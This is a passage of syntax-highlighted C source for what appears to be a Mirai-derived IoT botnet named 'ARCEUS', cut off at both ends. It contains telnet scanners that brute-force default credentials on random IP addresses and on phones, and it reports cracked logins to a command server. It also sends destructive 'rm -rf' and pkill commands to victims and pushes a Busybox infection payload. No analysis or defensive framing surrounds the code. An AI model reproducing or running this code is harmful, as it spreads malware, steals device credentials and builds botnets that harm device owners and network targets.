class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">        buffer = <span class="built_in">malloc</span>(SOCKBUF_SIZE + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, SOCKBUF_SIZE + <span class="number">1</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">telstate_t</span> <span class="title">fds</span>[<span class="title">max</span>];</span></span><br><span class="line">        <span class="built_in">memset</span>(fds, <span class="number">0</span>, max * (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line">                <span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">                fds[i].complete = <span class="number">1</span>;</span><br><span class="line">                fds[i].sockbuf = buffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(fds[i].tTimeout == <span class="number">0</span>) &#123;</span><br><span class="line">                                fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">switch</span>(fds[i].state) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].complete == <span class="number">1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">char</span> *tmp = fds[i].sockbuf;</span><br><span class="line">						<span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">						fds[i].sockbuf = tmp;</span><br><span class="line">						fds[i].ip = miraifindARandomIP();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span>(fds[i].complete == <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].usernameInd++;</span><br><span class="line">						fds[i].passwordInd++;</span><br><span class="line">						<span class="keyword">if</span>(fds[i].passwordInd == <span class="keyword">sizeof</span>(Mirai_Passwords) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *))</span><br><span class="line">						&#123;</span><br><span class="line">							fds[i].complete = <span class="number">1</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">if</span>(fds[i].usernameInd == <span class="keyword">sizeof</span>(Mirai_Usernames) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *))</span><br><span class="line">						&#123;</span><br><span class="line">							fds[i].complete = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">continue</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					dest_addr.sin_family = AF_INET;</span><br><span class="line">					dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">					<span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">					dest_addr.sin_addr.s_addr = fds[i].ip;</span><br><span class="line">					fds[i].fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span>(fds[i].fd == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) | O_NONBLOCK);</span><br><span class="line">					<span class="keyword">if</span>(connect(fds[i].fd, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)) == <span class="number">-1</span> &amp;&amp; errno != EINPROGRESS)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						advance_telstate(&amp;fds[i], <span class="number">1</span>);</span><br><span class="line">					&#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					FD_ZERO(&amp;fdset);</span><br><span class="line">					FD_SET(fds[i].fd, &amp;fdset);</span><br><span class="line">					tv.tv_sec = <span class="number">0</span>;</span><br><span class="line">					tv.tv_usec = wait_usec;</span><br><span class="line">					res = select(fds[i].fd+<span class="number">1</span>, <span class="literal">NULL</span>, &amp;fdset, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line">					<span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						lon = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">						valopt = <span class="number">0</span>;</span><br><span class="line">						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (<span class="keyword">void</span>*)(&amp;valopt), &amp;lon);</span><br><span class="line">						<span class="keyword">if</span>(valopt)</span><br><span class="line">						&#123;</span><br><span class="line">							reset_telstate(&amp;fds[i]);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) &amp; (~O_NONBLOCK));</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">2</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">-1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))</span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(contains_fail(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">3</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, Mirai_Usernames[fds[i].usernameInd], <span class="built_in">strlen</span>(Mirai_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					advance_telstate(&amp;fds[i], <span class="number">4</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))</span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(contains_fail(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">5</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;								</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, Mirai_Passwords[fds[i].passwordInd], <span class="built_in">strlen</span>(Mirai_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					advance_telstate(&amp;fds[i], <span class="number">6</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;									</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) <span class="comment">//waiting for response.</span></span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(contains_fail(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span> <span class="keyword">if</span>(contains_success(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span>(fds[i].complete == <span class="number">2</span>)</span><br><span class="line">							&#123;</span><br><span class="line">								advance_telstate(&amp;fds[i], <span class="number">7</span>);</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								sockprintf(mainCommSock, <span class="string">&quot;\x1b[0;31m[ARCEUS] Successfully Bruted IP: \x1b[0;33m%s\x1b[0;31m Port: \x1b[0;33m23 \x1b[0;31mUsername: \x1b[0;33m%s \x1b[0;31mPassword: \x1b[0;33m%s\x1b[0;37m&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">								sockprintf(mainCommSock, <span class="string">&quot;DICK %s:%s:%s&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">								advance_telstate(&amp;fds[i], <span class="number">7</span>);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							reset_telstate(&amp;fds[i]);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">char</span> RemoveTheTempDirs [<span class="number">80</span>];</span><br><span class="line">				<span class="built_in">sprintf</span>(RemoveTheTempDirs, <span class="string">&quot;rm -rf %s;&quot;</span>, Temp_Directorys);</span><br><span class="line">				<span class="keyword">if</span>(send(fds[i].fd, RemoveTheTempDirs, <span class="built_in">strlen</span>(RemoveTheTempDirs), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123; reset_telstate(&amp;fds[i]);<span class="keyword">continue</span>; &#125;</span><br><span class="line">				RemoveTempDirs();</span><br><span class="line">				<span class="comment">//sockprintf(mainCommSock, &quot;[ MIRAI ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">				<span class="keyword">char</span> killtheproccesses[<span class="number">80</span>];</span><br><span class="line">				<span class="built_in">sprintf</span>(killtheproccesses, <span class="string">&quot;pkill -9 %s;killall -9 %s;&quot;</span>, Bot_Killer_Binarys, Bot_Killer_Binarys);</span><br><span class="line">				<span class="keyword">if</span>(send(fds[i].fd, killtheproccesses, <span class="built_in">strlen</span>(killtheproccesses), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123; reset_telstate(&amp;fds[i]);<span class="keyword">continue</span>; &#125;</span><br><span class="line">				<span class="comment">//sockprintf(mainCommSock, &quot;[ MIRAI ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">				advance_telstate(&amp;fds[i], <span class="number">8</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			&#123;		</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;sh\r\n&quot;</span>, <span class="number">4</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>);</span><br><span class="line">						<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;shell\r\n&quot;</span>, <span class="number">7</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>);</span><br><span class="line">						<span class="keyword">if</span>(send(fds[i].fd, Busybox_Payload, <span class="built_in">strlen</span>(Busybox_Payload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123; reset_telstate(&amp;fds[i]);<span class="keyword">continue</span>; &#125;</span><br><span class="line">						<span class="comment">//sockprintf(mainCommSock, &quot;[ MIRAI ] Sending Infection Payload. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">						<span class="comment">//int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)</span></span><br><span class="line">						<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, <span class="string">&quot;connected&quot;</span>))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="comment">//char 	strcasestr (const char *big, const char *little)</span></span><br><span class="line">							<span class="keyword">if</span>(strcasestr(fds[i].sockbuf, <span class="string">&quot;CONNECTED&quot;</span>) &amp;&amp; fds[i].complete != <span class="number">3</span>)</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="comment">//sockprintf(mainCommSock, &quot;[ MIRAI ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">                        <span class="keyword">if</span>(fds[i].tTimeout + <span class="number">60</span> &lt; time(<span class="literal">NULL</span>)) </span><br><span class="line">						&#123;	</span><br><span class="line">							<span class="keyword">if</span>(fds[i].complete!=<span class="number">3</span>)</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="comment">//sockprintf(mainCommSock, &quot;[ MIRAI ] Infection Failed. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Mirai_Usernames[fds[i].usernameInd], Mirai_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">                            &#125;</span><br><span class="line">							reset_telstate(&amp;fds[i]);</span><br><span class="line">                        &#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;				</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PhoneScanner</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> maxfds = <span class="number">253</span>, i, res, j, valopt;</span><br><span class="line"><span class="keyword">int</span> max = maxfds;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>], cur_dir;</span><br><span class="line">fd_set fdset;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> lon;</span><br><span class="line">srand(time(<span class="literal">NULL</span>) ^ rand_cmwc());</span><br><span class="line"><span class="keyword">char</span> line[<span class="number">253</span>];</span><br><span class="line"><span class="keyword">char</span>* buffer;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">dest_addr.sin_family = AF_INET;</span><br><span class="line">dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line"><span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">buffer = <span class="built_in">malloc</span>(<span class="number">253</span> + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">253</span> + <span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">telstate_t</span> <span class="title">fds</span>[<span class="title">max</span>];</span></span><br><span class="line"><span class="built_in">memset</span>(fds, <span class="number">0</span>, max * (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">fds[i].sockbuf = buffer; &#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout == <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>); &#125;</span><br><span class="line"><span class="keyword">switch</span>(fds[i].state) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">char</span> *tmp = fds[i].sockbuf;</span><br><span class="line"><span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">fds[i].sockbuf = tmp;</span><br><span class="line">fds[i].ip = PhoneScan(); &#125;</span><br><span class="line">dest_addr.sin_family = AF_INET;</span><br><span class="line">dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line"><span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">dest_addr.sin_addr.s_addr = fds[i].ip;</span><br><span class="line">fds[i].fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fds[i].fd == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(connect(fds[i].fd, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)) == <span class="number">-1</span> &amp;&amp; errno != EINPROGRESS) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].complete = <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">1</span>;</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">FD_ZERO(&amp;fdset);</span><br><span class="line">FD_SET(fds[i].fd, &amp;fdset);</span><br><span class="line">tv.tv_sec = <span class="number">0</span>;</span><br><span class="line">tv.tv_usec = <span class="number">10000</span>;</span><br><span class="line">res = select(fds[i].fd+<span class="number">1</span>, <span class="literal">NULL</span>, &amp;fdset, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span>(res == <span class="number">1</span>) &#123;</span><br><span class="line">lon = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">valopt = <span class="number">0</span>;</span><br><span class="line">getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (<span class="keyword">void</span>*)(&amp;valopt), &amp;lon);</span><br><span class="line"><span class="keyword">if</span>(valopt) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) &amp; (~O_NONBLOCK));</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">fds[i].bufUsed = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(fds[i].sockbuf, <span class="number">0</span>, <span class="number">253</span>);</span><br><span class="line">fds[i].state = <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">-1</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">253</span>, phone)) &#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">3</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;admin\r\n&quot;</span>, <span class="number">7</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">253</span>, phone)) &#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">5</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;admin\r\n&quot;</span>, <span class="number">7</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">6</span>; &#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line"><span class="keyword">if</span> (read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">253</span>, advances2)) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sockprintf(mainCommSock, <span class="string">&quot;\e[96m[PHONE] \e[97mFound And Infected A Phone \e[96m[%s]&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">sockprintf(mainCommSock, <span class="string">&quot;DICK %s:%s:%s&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">fds[i].state = <span class="number">7</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: &#123;</span><br><span class="line">RemoveTempDirs();</span><br><span class="line"><span class="comment">//sockprintf(mainCommSock, &quot;[ PHONE ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: admin || Password: admin&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;su\r\n&quot;</span>, <span class="number">4</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span 